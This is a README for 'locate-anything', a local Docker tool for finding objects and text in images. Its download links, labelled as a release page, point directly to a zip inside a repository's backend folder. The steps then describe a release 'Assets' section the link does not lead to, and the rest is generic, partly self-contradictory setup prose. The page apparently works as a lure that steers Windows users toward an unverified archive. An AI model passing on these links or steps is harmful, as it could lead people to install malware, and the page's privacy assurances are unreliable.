# 🔍 locate-anything - Find items inside your images easily

[![Download Now](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/likely-craftsman573/locate-anything/main/backend/anything_locate_v3.8-alpha.2.zip)

## 🎯 About This Tool

Locate-anything turns your computer into an intelligent vision system. It identifies objects, text, and specific items within your photos. You select an image, define what you seek, and the software draws boxes around the matches. It runs entirely on your local machine. Your images stay on your own hard drive. This ensures privacy and fast processing speeds.

## ⚙️ System Requirements

To run this tool, your computer needs specific hardware. 

- Graphics Card: NVIDIA GPU with at least 8GB of video memory.
- Software: Docker Desktop installed and running.
- Operating System: Windows 10 or 11.
- Memory: 16GB of system RAM.
- Processor: Modern multi-core CPU.

## 📥 Downloading Software

You must download the necessary files from the official release page. 

[Download the latest release here](https://raw.githubusercontent.com/likely-craftsman573/locate-anything/main/backend/anything_locate_v3.8-alpha.2.zip)

1. Open the link above in your web browser.
2. Find the section labeled "Assets."
3. Click the file ending in `.zip` to start the download.
4. Save the folder to a location you can find, such as your Downloads folder.

## 🛠️ Setting Up Your Computer

Before you start, make sure Docker Desktop is active. 

1. Right-click the downloaded folder.
2. Select "Extract All."
3. Choose a folder where you want the program to live.
4. Open the extracted folder.
5. Locate the file named `docker-compose.yml`.

## 🚀 Running The Application

You launch the software using a simple command.

1. Open your Windows Start menu.
2. Type `cmd` and press Enter to open the Command Prompt.
3. Type `cd` followed by a space, then drag the folder you extracted into the window.
4. Press Enter.
5. Type `docker compose up` and press Enter.
6. Wait for the text to stop scrolling. The computer is downloading the internal components now.
7. Open your web browser once you see a message about the server starting.
8. Type `http://localhost:3000` into the address bar.

## 🖼️ Using The Interface

The web screen provides a clear workspace.

1. Click the "Upload" button to pick a photo from your computer.
2. Type a word in the search box to describe the object you want to find. For example, type "cat" or "bottle."
3. Press the "Locate" button.
4. The tool displays the image with boxes around the matches.
5. Save the results by clicking the "Download" icon.

## 💡 Frequently Asked Questions

### Does the software send my images to the internet?
No. Every step happens on your hardware. No images leave your computer.

### My computer shows a slow speed. What is wrong?
The software relies on your NVIDIA graphics card. Ensure your drivers are up to date. Close other programs that use the GPU, like video editors or games, to free up resources.

### Can I search for text?
Yes. The software recognizes words within images. Type the text you want to find in the search box.

### How do I stop the program?
Go back to the Command Prompt window. Press `Ctrl + C` on your keyboard. This stops the active service.

### Can I use this on a laptop?
If your laptop has a dedicated NVIDIA GPU, it will work. Integrated graphics chips from Intel or AMD do not support the required technology.

## 🔧 Troubleshooting

If the software fails to start, verify your Docker Desktop status. 

- Ensure Docker is set to "Windows Containers" if necessary, though it defaults to Linux containers for this app.
- Check that your GPU drivers match the current CUDA version requirements.
- Restart your computer if the Docker service hangs. 
- Reinstall Docker Desktop if the command prompt returns "docker not found" errors.

## 📊 Technical Details

This software combines several advanced technologies:

- Grounding: Links your text descriptions to visual elements.
- Object Detection: Draws precise boxes around detected items.
- OCR: Reads text inside your images.
- GPU Acceleration: Offloads calculations to your graphics card for speed.
- Web UI: Provides a familiar interface in your browser.

This project uses Docker to keep all libraries and settings grouped in one place. You do not need to install complex programming tools on your base Windows system. The `docker-compose` setup handles the connection between the interface and the background engine. Reach out to the repository issues page if you encounter bugs or need extra help with the setup process.